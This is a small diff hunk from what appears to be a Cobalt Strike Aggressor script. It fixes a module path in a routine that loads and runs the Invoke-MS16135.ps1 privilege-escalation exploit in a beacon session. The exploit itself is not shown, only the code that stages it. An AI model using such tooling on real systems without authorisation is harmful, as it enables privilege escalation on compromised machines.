@@ -318,7 +318,7 @@ sub ms16_135 {
 	$oneliner = beacon_host_script($1, $script);
 
 	# Source
-	$source = getFileProper(script_resource("elevate/modules/"), "Invoke-MS16135.ps1");
+	$source = getFileProper(script_resource("elevate/modules"), "Invoke-MS16135.ps1");
 
 	# Import & run
 	bpowershell_import!($1, $source);
